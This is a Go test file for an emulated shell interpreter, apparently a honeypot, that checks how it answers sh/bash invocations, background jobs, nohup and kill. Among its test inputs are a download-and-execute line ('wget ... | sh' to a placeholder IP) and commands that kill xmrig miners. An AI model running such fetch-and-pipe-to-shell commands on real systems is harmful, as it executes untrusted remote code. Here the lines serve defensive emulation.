package shell

import (
	"reflect"
	"strconv"
	"testing"
)

func TestShRunsItsInput(t *testing.T) {
	s := NewInterpreter("root")
	cases := []struct {
		line, want string
		code       int
	}{
		{`sh -c "echo a; echo b"`, "a\r\nb", 0},
		{`bash -c 'uname -s'`, "Linux", 0},
		{"echo 'echo piped' | sh", "piped", 0},
		{"echo 'uname -s' | bash -s", "Linux", 0},
		{"sh", "", 0},
		{"sh /tmp/none.sh", "sh: 0: cannot open /tmp/none.sh: No such file", 2},
		{"bash /tmp/none.sh", "bash: /tmp/none.sh: No such file or directory", 127},
		{"wget -qO- http://198.51.100.7/x | sh", "", 0},
		{"sh -c", "sh: 0: -c requires an argument", 2},
	}
	for _, tc := range cases {
		if out, code := run(t, s, tc.line); out != tc.want || code != tc.code {
			t.Errorf("%q = %q %d, want %q %d", tc.line, out, code, tc.want, tc.code)
		}
	}
	run(t, s, "echo 'echo from-file' > /tmp/a.sh")
	if out, code := run(t, s, "sh /tmp/a.sh"); out != "from-file" || code != 0 {
		t.Errorf("sh file = %q %d", out, code)
	}
}

func TestBackgroundAmpersandSeparates(t *testing.T) {
	got := splitStatements("./a & ./b &")
	want := []statement{{"", "./a"}, {";", "./b"}}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %#v", got)
	}
	for _, keep := range []string{"x 2>&1", "x &>/dev/null", "x >&2"} {
		if got := splitStatements(keep); len(got) != 1 {
			t.Errorf("%q split into %#v", keep, got)
		}
	}
	s := NewInterpreter("root")
	if out, code := run(t, s, "nohup uname -s &"); out != "Linux" || code != 0 {
		t.Errorf("nohup bg = %q %d", out, code)
	}
}

func TestNohupSleepKill(t *testing.T) {
	s := NewInterpreter("root")
	pid := 0
	for _, p := range s.pids {
		pid = p
		break
	}
	cases := []struct {
		line, want string
		code       int
	}{
		{"nohup", "nohup: missing operand\r\nTry 'nohup --help' for more information.", 125},
		{"sleep 5", "", 0},
		{"sleep", "sleep: missing operand\r\nTry 'sleep --help' for more information.", 1},
		{"kill -9 " + strconv.Itoa(pid), "", 0},
		{"kill -9 999999", "bash: kill: (999999) - No such process", 1},
		{"kill", "kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]", 2},
		{"pkill -9 xmrig", "", 1},
		{"killall -9 xmrig", "xmrig: no process found", 1},
	}
	for _, tc := range cases {
		if out, code := run(t, s, tc.line); out != tc.want || code != tc.code {
			t.Errorf("%q = %q %d, want %q %d", tc.line, out, code, tc.want, tc.code)
		}
	}
}
